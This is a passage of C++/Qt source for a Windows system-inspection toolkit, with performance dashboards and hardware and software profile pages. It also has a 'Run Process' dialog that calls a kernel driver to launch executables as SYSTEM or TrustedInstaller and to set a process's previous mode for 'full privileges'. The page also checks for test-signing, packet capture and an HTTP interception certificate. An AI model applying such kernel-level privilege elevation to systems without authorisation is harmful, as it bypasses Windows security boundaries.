        setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Fixed);

        auto *Layout = new QVBoxLayout(this);
        Layout->setContentsMargins(18, 16, 18, 16);
        Layout->setSpacing(12);

        auto *Header = new QHBoxLayout;
        Header->setContentsMargins(0, 0, 0, 0);
        Header->setSpacing(12);
        Header->addWidget(MakeGlyph(Glyph, 22), 0, Qt::AlignTop);

        auto *TitleLayout = new QVBoxLayout;
        TitleLayout->setContentsMargins(0, 0, 0, 0);
        TitleLayout->setSpacing(2);
        TitleLayout->addWidget(MakeLabel(Title, 14, KTextPrimary, QFont::DemiBold));
        auto *DescriptionLabel = MakeLabel(Description, 11, KTextMuted);
        DescriptionLabel->setWordWrap(true);
        TitleLayout->addWidget(DescriptionLabel);
        Header->addLayout(TitleLayout, 1);

        SummaryLabel = MakeLabel("0%", 16, KAccent, QFont::DemiBold);
        SummaryLabel->setAlignment(Qt::AlignRight | Qt::AlignVCenter);
        SummaryLabel->setMinimumWidth(96);
        Header->addWidget(SummaryLabel);

        ToggleButton = new PushButton("Collapse");
        ToggleButton->setCursor(Qt::PointingHandCursor);
        ToggleButton->setMinimumHeight(30);
        ToggleButton->setMinimumWidth(88);
        Header->addWidget(ToggleButton);
        Layout->addLayout(Header);

        Body = new QWidget;
        auto *BodyLayout = new QHBoxLayout(Body);
        BodyLayout->setContentsMargins(0, 0, 0, 0);
        BodyLayout->setSpacing(18);

        Gauge = new CircularGaugeWidget;
        BodyLayout->addWidget(Gauge, 0, Qt::AlignTop);

        auto *DetailLayout = new QVBoxLayout;
        DetailLayout->setContentsMargins(0, 2, 0, 0);
        DetailLayout->setSpacing(8);
        DetailPrimary = MakeLabel("-", 12, KTextPrimary, QFont::Medium);
        DetailSecondary = MakeLabel("-", 11, KTextMuted);
        DetailTertiary = MakeLabel("-", 11, KTextMuted);
        DetailPrimary->setWordWrap(true);
        DetailSecondary->setWordWrap(true);
        DetailTertiary->setWordWrap(true);
        DetailLayout->addWidget(DetailPrimary);
        DetailLayout->addWidget(DetailSecondary);
        DetailLayout->addWidget(DetailTertiary);
        DetailLayout->addStretch();
        BodyLayout->addLayout(DetailLayout, 1);
        Layout->addWidget(Body);

        QObject::connect(ToggleButton, &QPushButton::clicked, this, [this] {
            if (ToggleHandler)
                ToggleHandler(!Expanded);
            else
                SetExpanded(!Expanded);
        });
    }

    void SetExpanded(bool Value)
    {
        Expanded = Value;
        Body->setVisible(Expanded);
        ToggleButton->setText(Expanded ? "Collapse" : "Expand");
    }

    bool IsExpanded() const
    {
        return Expanded;
    }

    void SetToggleHandler(std::function<void(bool)> Handler)
    {
        ToggleHandler = std::move(Handler);
    }

    void UpdateDashboard(int Percent, const QString &Summary, const QString &Primary, const QString &Secondary,
                         const QString &Tertiary)
    {
        const int SafePercent = std::clamp(Percent, 0, 100);
        SummaryLabel->setText(Summary);
        Gauge->SetValue(SafePercent, Summary);
        DetailPrimary->setText(Primary);
        DetailSecondary->setText(Secondary);
        DetailTertiary->setText(Tertiary);
    }

  private:
    bool Expanded = true;
    QWidget *Body = nullptr;
    PushButton *ToggleButton = nullptr;
    CircularGaugeWidget *Gauge = nullptr;
    FluentLabelBase *SummaryLabel = nullptr;
    FluentLabelBase *DetailPrimary = nullptr;
    FluentLabelBase *DetailSecondary = nullptr;
    FluentLabelBase *DetailTertiary = nullptr;
    std::function<void(bool)> ToggleHandler;
};

TableWidget *MakeTable(const QStringList &Headers)
{
    auto *Table = new TableWidget;
    InstallFluentScrollBar(Table, Qt::Vertical);
    InstallFluentScrollBar(Table, Qt::Horizontal);
    Table->setColumnCount(Headers.size());
    Table->setRowCount(0);
    Table->setHorizontalHeaderLabels(Headers);
    Table->horizontalHeader()->setStretchLastSection(true);
    Table->horizontalHeader()->setMinimumSectionSize(80);
    Table->verticalHeader()->hide();
    Table->setAlternatingRowColors(false);
    Table->setSelectionBehavior(QAbstractItemView::SelectRows);
    Table->setEditTriggers(QAbstractItemView::NoEditTriggers);
    Table->setShowGrid(false);
    Table->setWordWrap(false);
    Table->setTextElideMode(Qt::ElideRight);
    Table->setProperty("UseGenericDetailDialog", true);
    QObject::connect(Table, &QTableWidget::cellDoubleClicked, Table, [Table](int Row, int) {
        if (!Table->property("UseGenericDetailDialog").toBool() || Row < 0 || Row >= Table->rowCount())
            return;

        QStringList Lines;
        for (int Column = 0; Column < Table->columnCount(); ++Column)
        {
            const QString Header = Table->horizontalHeaderItem(Column)
                                       ? Table->horizontalHeaderItem(Column)->text()
                                       : QString("Column %1").arg(Column + 1);
            const QTableWidgetItem *Item = Table->item(Row, Column);
            const QString Value = Item ? Item->text() : QString();
            Lines.append(QString("%1: %2").arg(Header, Value.isEmpty() ? "(empty)" : Value));
        }

        auto *Dialog = new QDialog(Table->window());
        Dialog->setAttribute(Qt::WA_DeleteOnClose);
        Dialog->resize(900, 620);
        Dialog->setWindowTitle(Table->property("DetailDialogTitle").toString().isEmpty()
                                   ? QString("Details")
                                   : Table->property("DetailDialogTitle").toString());
        auto *Layout = new QVBoxLayout(Dialog);
        Layout->setContentsMargins(16, 16, 16, 16);
        Layout->setSpacing(10);
        auto *Text = new PlainTextEdit;
        Text->setReadOnly(true);
        Text->setFont(QFont("Cascadia Mono", 10));
        Text->setPlainText(Lines.join("\n\n"));
        InstallFluentScrollBar(Text, Qt::Vertical);
        auto *Close = MakeButton("Close", true);
        Layout->addWidget(Text, 1);
        Layout->addWidget(Close, 0, Qt::AlignRight);
        QObject::connect(Close, &QPushButton::clicked, Dialog, &QDialog::accept);
        Dialog->show();
    });
    return Table;
}

void ConfigureToolbarLayout(QHBoxLayout *Layout, int Spacing)
{
    if (!Layout)
        return;
    Layout->setContentsMargins(0, 0, 0, 0);
    Layout->setSpacing(Spacing);
}

void ConfigurePageLayout(QVBoxLayout *Layout, int Spacing = 12)
{
    if (!Layout)
        return;
    Layout->setContentsMargins(0, 0, 0, 0);
    Layout->setSpacing(Spacing);
}

PushButton *MakeButton(const QString &Text, bool Primary)
{
    PushButton *Button = Primary ? static_cast<PushButton *>(new PrimaryPushButton(Text)) : new PushButton(Text);
    Button->setCursor(Qt::PointingHandCursor);
    Button->setMinimumHeight(34);
    return Button;
}

void ConnectMenuAction(QAction *Action, QObject *Context, std::function<void()> Handler)
{
    QObject::connect(Action, &QAction::triggered, Context,
                     [Context = QPointer<QObject>(Context), Handler = std::move(Handler)] {
        if (!Context)
            return;
        QTimer::singleShot(0, Context, [Context, Handler] {
            if (Context)
                Handler();
        });
    });
}

void ReleaseMenuAfterClose(RoundMenu *Menu)
{
    QObject::connect(Menu, &RoundMenu::closed, Menu, [Menu = QPointer<RoundMenu>(Menu)] {
        QTimer::singleShot(0, qApp, [Menu] {
            if (Menu)
                Menu->deleteLater();
        });
    });
}

void ShowNotice(QWidget *Parent, InfoBar::Type Type, const QString &Title, const QString &Content)
{
    QWidget *Target = Parent ? Parent->window() : QApplication::activeWindow();
    InfoBar::newInfoBar(Type, Title, Content, Qt::Horizontal, true, 3500,
                        InfoBar::Position::TOP_RIGHT, Target);
}

void ShowSuccessNotice(QWidget *Parent, const QString &Title, const QString &Content)
{
    ShowNotice(Parent, InfoBar::Type::SUCCESS, Title, Content);
}

void ShowErrorNotice(QWidget *Parent, const QString &Title, const QString &Content)
{
    ShowNotice(Parent, InfoBar::Type::ERROR, Title, Content);
}

void ShowWarningNotice(QWidget *Parent, const QString &Title, const QString &Content)
{
    ShowNotice(Parent, InfoBar::Type::WARNING, Title, Content);
}

QString DescribeSetTokenError(DWORD ErrorCode)
{
    switch (ErrorCode)
    {
    case ERROR_NOT_FOUND:
        return "Token operation failed: the kernel driver could not locate the process token layout on this system build.";
    case ERROR_INVALID_PARAMETER:
        return "Token operation failed: the source or target process parameter was invalid.";
    default:
        return QString("Token operation failed (error %1).").arg(ErrorCode);
    }
}

QString DescribeLaunchAsError(ULONG AccountType, DWORD ErrorCode)
{
    switch (ErrorCode)
    {
    case ERROR_NOT_FOUND:
        return AccountType == ACCOUNT_TYPE_TRUSTEDINSTALLER
                   ? "Process launch failed: TrustedInstaller is not running or its token source could not be resolved."
                   : "Process launch failed: the source account process could not be resolved by the driver.";
    case ERROR_INVALID_PARAMETER:
        return "Process launch failed: the executable path could not be converted to a Win32 launch path or the account type was invalid.";
    case ERROR_ACCESS_DENIED:
        return "Process launch failed: the driver rejected the token assignment for the suspended process.";
    default:
        return QString("Process launch failed (error %1).").arg(ErrorCode);
    }
}

bool ConvertExecutablePathToDevicePath(const QString &Path, QString &NtPath)
{
    QString NativePath = QDir::toNativeSeparators(Path);
    if (NativePath.startsWith("\\Device\\", Qt::CaseInsensitive))
    {
        NtPath = NativePath;
        return true;
    }
    if (NativePath.startsWith("\\\\"))
    {
        NtPath = "\\Device\\Mup" + NativePath.mid(1);
        return true;
    }
    if (NativePath.size() < 3 || NativePath.at(1) != ':')
        return false;

    const QString Drive = NativePath.left(2);
    std::vector<wchar_t> DeviceBuffer(32768, L'\0');
    if (QueryDosDeviceW(reinterpret_cast<LPCWSTR>(Drive.utf16()), DeviceBuffer.data(),
                        static_cast<DWORD>(DeviceBuffer.size())) == 0)
        return false;
    NtPath = QString::fromWCharArray(DeviceBuffer.data()) + NativePath.mid(2);
    return NtPath.startsWith("\\Device\\", Qt::CaseInsensitive);
}

bool ConvertDriverServiceImagePath(const QString &Path, QString &KernelPath)
{
    const QString NativePath = QDir::toNativeSeparators(Path.trimmed());
    if (NativePath.isEmpty())
        return false;

    if (NativePath.startsWith("\\??\\", Qt::CaseInsensitive) ||
        NativePath.startsWith("\\SystemRoot\\", Qt::CaseInsensitive))
    {
        KernelPath = NativePath;
        return true;
    }

    if (NativePath.startsWith("\\Device\\", Qt::CaseInsensitive))
    {
        KernelPath = NativePath;
        return true;
    }

    if (NativePath.startsWith("\\\\"))
    {
        KernelPath = "\\??\\UNC" + NativePath.mid(1);
        return true;
    }

    if (NativePath.size() >= 3 &&
        NativePath.at(1) == ':' &&
        (NativePath.at(2) == '\\' || NativePath.at(2) == '/'))
    {
        KernelPath = "\\??\\" + NativePath;
        return true;
    }

    return false;
}

void ShowLaunchAsDialog(QWidget *Parent)
{
    auto *Dialog = new MessageBoxBase(Parent ? Parent->window() : QApplication::activeWindow());
    Dialog->setAttribute(Qt::WA_DeleteOnClose);
    Dialog->setWindowTitle("Run");

    auto *Title = MakeLabel("Run Process", 16, KTextPrimary, QFont::DemiBold);
    auto *Description = MakeLabel("Launch an executable as SYSTEM or TrustedInstaller.", 12, KTextMuted);
    Description->setWordWrap(true);

    auto *Form = new QWidget;
    auto *Grid = new QGridLayout(Form);
    Grid->setContentsMargins(0, 0, 0, 0);
    Grid->setHorizontalSpacing(10);
    Grid->setVerticalSpacing(10);

    auto *Context = new ComboBox;
    Context->addItems({"SYSTEM", "TrustedInstaller"});
    Context->setCurrentIndex(0);
    auto *Executable = new LineEdit;
    Executable->setPlaceholderText("Select an executable");
    auto *Arguments = new LineEdit;
    Arguments->setPlaceholderText("Arguments (currently unsupported)");
    auto *FullPrivileges = new CheckBox("Enable Full Privileges");
    auto *Browse = MakeButton("Browse");

    Grid->addWidget(MakeLabel("Security context", 10, KTextPrimary, QFont::DemiBold), 0, 0);
    Grid->addWidget(Context, 0, 1, 1, 2);
    Grid->addWidget(MakeLabel("Executable", 10, KTextPrimary, QFont::DemiBold), 1, 0);
    Grid->addWidget(Executable, 1, 1);
    Grid->addWidget(Browse, 1, 2);
    Grid->addWidget(MakeLabel("Arguments", 10, KTextPrimary, QFont::DemiBold), 2, 0);
    Grid->addWidget(Arguments, 2, 1, 1, 2);
    Grid->addWidget(FullPrivileges, 3, 1, 1, 2);
    Grid->setColumnStretch(1, 1);

    Dialog->viewLayout()->addWidget(Title);
    Dialog->viewLayout()->addWidget(Description);
    Dialog->viewLayout()->addWidget(Form);
    Dialog->yesButton()->setText("Run");
    Dialog->cancelButton()->setText("Cancel");

    QObject::connect(Browse, &QPushButton::clicked, Dialog, [Dialog, Executable] {
        const QString Path =
            QFileDialog::getOpenFileName(Dialog, "Select executable", QString(), "Executable files (*.exe);;All files (*.*)");
        if (!Path.isEmpty())
            Executable->setText(QDir::toNativeSeparators(Path));
    });
    QObject::connect(Dialog->yesButton(), &QPushButton::clicked, Dialog,
                     [Dialog, Parent, Context, Executable, Arguments, FullPrivileges] {
        const QString Path = Executable->text().trimmed();
        QString NtPath;
        ULONG ProcessId = 0;
        if (Path.isEmpty() || !QFileInfo::exists(Path))
        {
            ShowWarningNotice(Parent, "Run", "Select an existing executable file.");
            return;
        }
        if (!Arguments->text().trimmed().isEmpty())
        {
            ShowWarningNotice(Parent, "Run", "The current LaunchAs backend supports executable paths only.");
            return;
        }
        if (!ConvertExecutablePathToDevicePath(Path, NtPath))
        {
            ShowErrorNotice(Parent, "Run", "Unable to convert the executable path to a kernel device path.");
            return;
        }
        const ULONG AccountType =
            Context->currentIndex() == 0 ? ACCOUNT_TYPE_SYSTEM : ACCOUNT_TYPE_TRUSTEDINSTALLER;
        if (!LaunchAs(AccountType, NtPath.toStdWString().c_str(), &ProcessId))
        {
            ShowErrorNotice(Parent, "Run", DescribeLaunchAsError(AccountType, G_LastMultiDrvError));
            return;
        }
        ShowSuccessNotice(Parent, "Run",
                          AccountType == ACCOUNT_TYPE_SYSTEM ? QString("Process launched as SYSTEM with pid %1.").arg(ProcessId)
                                                             : QString("Process launched as TrustedInstaller with pid  %1.").arg(ProcessId));
        if (FullPrivileges->isChecked()) {
            SetProcessPreviousMode(ProcessId);
        }
        Dialog->accept();
    });
    QObject::connect(Dialog->cancelButton(), &QPushButton::clicked, Dialog, &QDialog::reject);
    Dialog->show();
}

QWidget *WrapPage(QWidget *Body)
{
    auto *Page = new QWidget;
    auto *Layout = new QVBoxLayout(Page);
    Layout->setContentsMargins(0, 0, 0, 0);
    Layout->addWidget(Body);
    return Page;
}

class InformationOverviewPage final : public QWidget
{
  public:
    InformationOverviewPage(QWidget *Parent = nullptr) : QWidget(Parent)
    {
        auto *RootLayout = new QVBoxLayout(this);
        RootLayout->setContentsMargins(0, 0, 0, 0);
        RootLayout->setSpacing(0);

        auto *Content = new QWidget;
        Content->setObjectName("InformationContent");
        Content->setAutoFillBackground(false);
        auto *Layout = new QVBoxLayout(Content);
        Layout->setContentsMargins(8, 18, 8, 24);
        Layout->setSpacing(16);

        const QString Computer = QProcessEnvironment::systemEnvironment().value("COMPUTERNAME", "Unknown");
        const QString User = QProcessEnvironment::systemEnvironment().value("USERNAME", "Unknown");

        auto *Hero = new SimpleCardWidget;
        Hero->setBorderRadius(10);
        Hero->setMinimumHeight(150);
        auto *HeroLayout = new QHBoxLayout(Hero);
        HeroLayout->setContentsMargins(18, 16, 20, 16);
        HeroLayout->setSpacing(18);

        auto *Avatar = new QLabel(QString(User.isEmpty() ? "U" : User.left(1).toUpper()));
        Avatar->setFixedSize(82, 82);
        Avatar->setAlignment(Qt::AlignCenter);
        Avatar->setStyleSheet(QString(
                                  "background:%1; color:white; border-radius:41px; font-size:28px; font-weight:700;")
                                  .arg(ConfiguredColor("AccentColor", KAccent).name()));
        HeroLayout->addWidget(Avatar, 0, Qt::AlignVCenter);

        auto *HeroText = new QVBoxLayout;
        HeroText->setContentsMargins(8, 4, 0, 4);
        HeroText->setSpacing(6);
        HeroText->addWidget(MakeLabel(QString("Hello, %1").arg(User), 19, KTextPrimary, QFont::DemiBold));
        HeroText->addWidget(MakeLabel(QString("Signed in on %1").arg(Computer), 12, KTextMuted));
        auto *QuoteLabel = MakeLabel(RandomInformationQuote(), 12, KTextPrimary, QFont::Medium);
        QuoteLabel->setWordWrap(true);
        HeroText->addWidget(QuoteLabel);
        HeroText->addStretch();
        HeroLayout->addLayout(HeroText, 1);

        auto *HeroPickerColumn = new QVBoxLayout;
        HeroPickerColumn->setContentsMargins(0, 0, 0, 0);
        HeroPickerColumn->setSpacing(8);
        HeroPickerColumn->addWidget(MakeLabel("Date", 11, KTextMuted, QFont::Medium), 0, Qt::AlignLeft);
        HeroDateEdit = new ZhDatePicker(this);
        HeroDateEdit->setMinimumWidth(170);
        HeroDateEdit->setDate(QDate::currentDate());
        HeroPickerColumn->addWidget(HeroDateEdit, 0, Qt::AlignLeft);
        HeroPickerColumn->addWidget(MakeLabel("Time", 11, KTextMuted, QFont::Medium), 0, Qt::AlignLeft);
        HeroTimeEdit = new TimePicker(this, true);
        HeroTimeEdit->setMinimumWidth(170);
        HeroPickerColumn->addWidget(HeroTimeEdit, 0, Qt::AlignLeft);
        HeroPickerColumn->addStretch();
        HeroLayout->addLayout(HeroPickerColumn, 0);

        auto *HeroHost = new QWidget;
        auto *HeroHostLayout = new QHBoxLayout(HeroHost);
        HeroHostLayout->setContentsMargins(-6, 0, -6, 0);
        HeroHostLayout->setSpacing(0);
        HeroHostLayout->addWidget(Hero);
        Layout->addWidget(HeroHost);

        auto *OverviewCard = new SimpleCardWidget;
        OverviewCard->setBorderRadius(10);
        OverviewCard->setMinimumHeight(248);
        auto *OverviewLayout = new QHBoxLayout(OverviewCard);
        OverviewLayout->setContentsMargins(24, 24, 28, 24);
        OverviewLayout->setSpacing(30);

        auto *OverviewArtworkHost = new QWidget;
        OverviewArtworkHost->setFixedSize(248, 248);
        auto *OverviewArtworkLayout = new QVBoxLayout(OverviewArtworkHost);
        OverviewArtworkLayout->setContentsMargins(0, 0, 0, 0);
        OverviewArtworkLayout->setSpacing(0);
        OverviewArtworkLayout->addWidget(MakeApplicationIconFitWidget(QSize(248, 248)), 0, Qt::AlignCenter);
        OverviewLayout->addWidget(OverviewArtworkHost, 0, Qt::AlignVCenter);

        auto *OverviewText = new QVBoxLayout;
        OverviewText->setContentsMargins(8, 6, 0, 6);
        OverviewText->setSpacing(8);
        OverviewText->addWidget(MakeLabel("Information", 20, KTextPrimary, QFont::DemiBold));
        auto *HeroDescription =
            MakeLabel("Kernel and user-mode inspection workspace with runtime status, hardware telemetry, and environment summary.",
                      12, KTextMuted);
        HeroDescription->setWordWrap(true);
        OverviewText->addWidget(HeroDescription);
        const QString ApplicationVersion = ConfigurationValue("Application", "Version", "1.0.0").toString();
        OverviewText->addWidget(MakeLabel(QString("System management toolkit  |  v%1").arg(ApplicationVersion), 12,
                                          KTextMuted));
        OverviewText->addStretch();
        OverviewLayout->addLayout(OverviewText, 1);
        Layout->addWidget(OverviewCard);

        const auto AddSection = [Layout](const QString &Title, const QString &Description) {
            Layout->addWidget(new InformationSectionHeader(Title, Description));
        };

        const QString TestSigning = QueryTestSigning();
        const QString Npcap = QueryNpcap();
        const QString Certificate = CertificateState();
        AddSection("Runtime environment", "Pre-flight items required by kernel-assisted features and traffic monitoring.");

        auto *RuntimeCard = new SimpleCardWidget;
        RuntimeCard->setBorderRadius(10);
        auto *RuntimeLayout = new QVBoxLayout(RuntimeCard);
        RuntimeLayout->setContentsMargins(16, 16, 16, 16);
        RuntimeLayout->setSpacing(10);
        RuntimeLayout->addWidget(new InformationItem(Fluent::IconType::ACCEPT, "TestSigning",
                                                     "Windows test-signing mode required by kernel tools.", TestSigning));
        RuntimeLayout->addWidget(new InformationItem(Fluent::IconType::CONNECT, "Npcap Service",
                                                     "Packet capture service used by network monitoring.", Npcap));
        RuntimeLayout->addWidget(new InformationItem(Fluent::IconType::CERTIFICATE, "HTTP Certificate",
                                                     "Root certificate used for HTTP traffic inspection.", Certificate));
        if (TestSigning != "Enabled" || Npcap != "Running" || Certificate != "Certificate available")
        {
            RuntimeLayout->addWidget(
                new InformationNoticeCard(Fluent::IconType::INFO, "Runtime requirements incomplete",
                                          "TestSigning, Npcap, and the HTTP certificate should all be available before using kernel and monitor features.",
                                          QColor("#B58A18")));
        }
        Layout->addWidget(RuntimeCard);

        const QString Manufacturer = QuerySystemManufacturer();
        const QString Model = QuerySystemModel();
        const QString Cpu = QueryCpuName();
        const QString Board = QueryBoardName();
        const QString Bios = QueryBiosName();
        const QString Graphics = QueryGraphicsAdapters();
        const QString MemoryInstalled = QueryMemoryInstalled();
        const QString SystemDrive = QuerySystemDriveSummary();
        const SYSTEM_INFO SystemInfo = [] {
            SYSTEM_INFO Value{};
            GetNativeSystemInfo(&Value);
            return Value;
        }();

        AddSection("Performance dashboards", "Live system load sampled every second. Collapse any card to fold all four together.");
        auto *DashboardSurface = new SimpleCardWidget;
        DashboardSurface->setBorderRadius(10);
        auto *DashboardSurfaceLayout = new QVBoxLayout(DashboardSurface);
        DashboardSurfaceLayout->setContentsMargins(16, 16, 16, 16);
        DashboardSurfaceLayout->setSpacing(0);

        auto *DashboardContainer = new QWidget;
        auto *DashboardLayout = new QGridLayout(DashboardContainer);
        DashboardLayout->setContentsMargins(0, 0, 0, 0);
        DashboardLayout->setHorizontalSpacing(12);
        DashboardLayout->setVerticalSpacing(12);

        CpuDashboard = new PerformanceDashboardCard(Fluent::IconType::DEVELOPER_TOOLS, "CPU",
                                                    "Processor utilization and topology.");
        MemoryDashboard = new PerformanceDashboardCard(Fluent::IconType::TILES, "Memory",
                                                       "Physical memory pressure and commit usage.");
        DiskDashboard = new PerformanceDashboardCard(Fluent::IconType::FOLDER, "Disk",
                                                     "System drive occupancy and free capacity.");
        NetworkDashboard = new PerformanceDashboardCard(Fluent::IconType::GLOBE, "Network",
                                                        "Aggregate receive and transmit throughput.");

        DashboardLayout->addWidget(CpuDashboard, 0, 0);
        DashboardLayout->addWidget(MemoryDashboard, 0, 1);
        DashboardLayout->addWidget(DiskDashboard, 1, 0);
        DashboardLayout->addWidget(NetworkDashboard, 1, 1);
        DashboardLayout->setColumnStretch(0, 1);
        DashboardLayout->setColumnStretch(1, 1);
        DashboardSurfaceLayout->addWidget(DashboardContainer);
        Layout->addWidget(DashboardSurface);

        const auto SyncDashboards = [this](bool Expanded) {
            if (CpuDashboard)
                CpuDashboard->SetExpanded(Expanded);
            if (MemoryDashboard)
                MemoryDashboard->SetExpanded(Expanded);
            if (DiskDashboard)
                DiskDashboard->SetExpanded(Expanded);
            if (NetworkDashboard)
                NetworkDashboard->SetExpanded(Expanded);
        };
        CpuDashboard->SetToggleHandler(SyncDashboards);
        MemoryDashboard->SetToggleHandler(SyncDashboards);
        DiskDashboard->SetToggleHandler(SyncDashboards);
        NetworkDashboard->SetToggleHandler(SyncDashboards);

        AddSection("Hardware profile", "Firmware, processor, graphics, and storage details detected from the current machine.");
        auto *HardwareCard = new SimpleCardWidget;
        HardwareCard->setBorderRadius(10);
        auto *HardwareLayout = new QGridLayout(HardwareCard);
        HardwareLayout->setContentsMargins(16, 16, 16, 16);
        HardwareLayout->setHorizontalSpacing(12);
        HardwareLayout->setVerticalSpacing(12);
        const QList<QWidget *> HardwareItems = {
            new InformationItem(Fluent::IconType::APPLICATION, "Computer", "Current Windows device name.", Computer),
            new InformationItem(Fluent::IconType::PEOPLE, "Manufacturer", "System vendor reported by firmware.",
                                Manufacturer.isEmpty() ? "Unknown" : Manufacturer),
            new InformationItem(Fluent::IconType::APPLICATION, "Model", "System product model exposed by firmware.",
                                Model.isEmpty() ? "Unknown" : Model),
            new InformationItem(Fluent::IconType::DEVELOPER_TOOLS, "Processor", "Primary CPU identification string.",
                                Cpu.isEmpty() ? "Unknown" : Cpu),
            new InformationItem(Fluent::IconType::LAYOUT, "Logical Processors", "Online CPU execution contexts.",
                                QString::number(SystemInfo.dwNumberOfProcessors)),
            new InformationItem(Fluent::IconType::PHOTO, "Graphics", "Active display adapters currently attached.",
                                Graphics.isEmpty() ? "Unknown" : Graphics),
            new InformationItem(Fluent::IconType::TILES, "Installed Memory", "Total visible physical memory.",
                                MemoryInstalled),
            new InformationItem(Fluent::IconType::LAYOUT, "Mainboard", "Baseboard manufacturer and product.",
                                Board.isEmpty() ? "Unknown" : Board),
            new InformationItem(Fluent::IconType::INFO, "BIOS", "Firmware vendor and exported version.",
                                Bios.isEmpty() ? "Unknown" : Bios),
            new InformationItem(Fluent::IconType::FOLDER, "System Drive", "Application drive and current used capacity.",
                                SystemDrive)};
        for (int Index = 0; Index < HardwareItems.size(); ++Index)
            HardwareLayout->addWidget(HardwareItems[Index], Index / 2, Index % 2);
        HardwareLayout->setColumnStretch(0, 1);
        HardwareLayout->setColumnStretch(1, 1);
        Layout->addWidget(HardwareCard);

        const quint64 UptimeMs = GetTickCount64();
        const QDateTime BootTime = QDateTime::currentDateTime().addMSecs(-static_cast<qint64>(UptimeMs));
        AddSection("Software profile", "Operating system, boot state, and current process runtime information.");
        auto *SoftwareCard = new SimpleCardWidget;
        SoftwareCard->setBorderRadius(10);
        auto *SoftwareLayout = new QGridLayout(SoftwareCard);
        SoftwareLayout->setContentsMargins(16, 16, 16, 16);
        SoftwareLayout->setHorizontalSpacing(12);
        SoftwareLayout->setVerticalSpacing(12);
        const QList<QWidget *> SoftwareItems = {
            new InformationItem(Fluent::IconType::GLOBE, "Operating System",
                                "Edition, release channel, and build number.", QueryWindowsVersionText()),
            new InformationItem(Fluent::IconType::COMMAND_PROMPT, "Kernel",
                                "Kernel family and architecture used by the current process.",
                                QString("%1  |  %2").arg(QSysInfo::kernelVersion(), QSysInfo::currentCpuArchitecture())),
            new InformationItem(Fluent::IconType::INFO, "Boot Time", "Estimated local boot timestamp.",
                                BootTime.toString("yyyy-MM-dd HH:mm:ss")),
            new InformationItem(Fluent::IconType::STOP_WATCH, "Uptime",
                                "Elapsed time since the last system boot.", FormatDuration(UptimeMs)),
            new InformationItem(Fluent::IconType::TILES, "Runtime", "Application framework and release version.",
                                QString("Qt %1  |  v%2").arg(QT_VERSION_STR, ApplicationVersion)),
            new InformationItem(Fluent::IconType::COMMAND_PROMPT, "Process",
                                "Current process ID and executable name.",
                                QString("%1  |  PID %2")
                                    .arg(QFileInfo(QCoreApplication::applicationFilePath()).fileName())
                                    .arg(QCoreApplication::applicationPid())),
            new InformationItem(Fluent::IconType::HOME, "Application Path",
                                "Runtime directory used by configuration and modules.",
                                QDir::toNativeSeparators(QCoreApplication::applicationDirPath()))};
        for (int Index = 0; Index < SoftwareItems.size(); ++Index)
            SoftwareLayout->addWidget(SoftwareItems[Index], Index / 2, Index % 2);
        SoftwareLayout->setColumnStretch(0, 1);
        SoftwareLayout->setColumnStretch(1, 1);
        Layout->addWidget(SoftwareCard);

        Layout->addStretch();

        auto *Scroll = new ScrollArea;
        InstallFluentScrollBar(Scroll, Qt::Vertical);
        Scroll->setObjectName("InformationScroll");
        Scroll->setWidgetResizable(true);
        Scroll->setFrameShape(QFrame::NoFrame);
        Scroll->viewport()->setAutoFillBackground(false);
        Scroll->setWidget(Content);
        RootLayout->addWidget(Scroll);

        const auto CurrentCpuTimes = QueryCpuTimes();
        PreviousIdle = CurrentCpuTimes.Idle;
        PreviousKernel = CurrentCpuTimes.Kernel;
        PreviousUser = CurrentCpuTimes.User;
        PreviousNetwork = QueryNetworkTrafficSnapshot();
        PreviousSampleTime = QDateTime::currentMSecsSinceEpoch();

        UpdateHeroClock();
        UpdatePerformance();
        RefreshTimer = new QTimer(this);
        RefreshTimer->setInterval(1000);
        QObject::connect(RefreshTimer, &QTimer::timeout, this, [this] {
            UpdateHeroClock();
            if (isVisible())
                UpdatePerformance();
        });
        RefreshTimer->start();
    }

  private:
    struct CpuTimes
    {
        quint64 Idle = 0;
        quint64 Kernel = 0;
        quint64 User = 0;
    };

    static CpuTimes QueryCpuTimes()
    {
        FILETIME IdleTime{}, KernelTime{}, UserTime{};
        if (!GetSystemTimes(&IdleTime, &KernelTime, &UserTime))
            return {};
        const auto ToUInt64 = [](const FILETIME &Value) {
            ULARGE_INTEGER Integer{};
            Integer.LowPart = Value.dwLowDateTime;
            Integer.HighPart = Value.dwHighDateTime;
            return static_cast<quint64>(Integer.QuadPart);
        };
        return {ToUInt64(IdleTime), ToUInt64(KernelTime), ToUInt64(UserTime)};
    }

    void UpdateHeroClock()
    {
        if (!HeroDateEdit || !HeroTimeEdit)
            return;
        const QDateTime Current = QDateTime::currentDateTime();
        HeroDateEdit->setDate(Current.date());
        HeroTimeEdit->setTime(Current.time());
    }

    void UpdatePerformance()
    {
        UpdateCpu();
        UpdateMemory();
        UpdateDisk();
        UpdateNetwork();
    }

    void UpdateCpu()
    {
        const CpuTimes Current = QueryCpuTimes();
        const quint64 IdleDelta = Current.Idle - PreviousIdle;
        const quint64 KernelDelta = Current.Kernel - PreviousKernel;
        const quint64 UserDelta = Current.User - PreviousUser;
        const quint64 TotalDelta = KernelDelta + UserDelta;
        const int Usage = TotalDelta == 0 ? 0
                                          : static_cast<int>(std::clamp(
                                                qRound(((TotalDelta - IdleDelta) * 100.0) / TotalDelta), 0, 100));

        PreviousIdle = Current.Idle;
        PreviousKernel = Current.Kernel;
        PreviousUser = Current.User;

        SYSTEM_INFO Info{};
        GetNativeSystemInfo(&Info);
        CpuDashboard->UpdateDashboard(
            Usage, QString::number(Usage) + "%", QString("%1 logical processor(s)").arg(Info.dwNumberOfProcessors),
            QString("Architecture: %1").arg(QSysInfo::currentCpuArchitecture()),
            QueryCpuName().isEmpty() ? "CPU name unavailable" : QueryCpuName());
    }

    void UpdateMemory()
    {
        MEMORYSTATUSEX Memory{};
        Memory.dwLength = sizeof(Memory);
        if (!GlobalMemoryStatusEx(&Memory))
            return;
        const quint64 UsedPhysical = Memory.ullTotalPhys > Memory.ullAvailPhys ? Memory.ullTotalPhys - Memory.ullAvailPhys : 0;
        const quint64 UsedCommit = Memory.ullTotalPageFile > Memory.ullAvailPageFile ? Memory.ullTotalPageFile - Memory.ullAvailPageFile : 0;
        MemoryDashboard->UpdateDashboard(
            static_cast<int>(Memory.dwMemoryLoad), QString::number(Memory.dwMemoryLoad) + "%",
            QString("Physical: %1 / %2").arg(FormatBytes(UsedPhysical), FormatBytes(Memory.ullTotalPhys)),
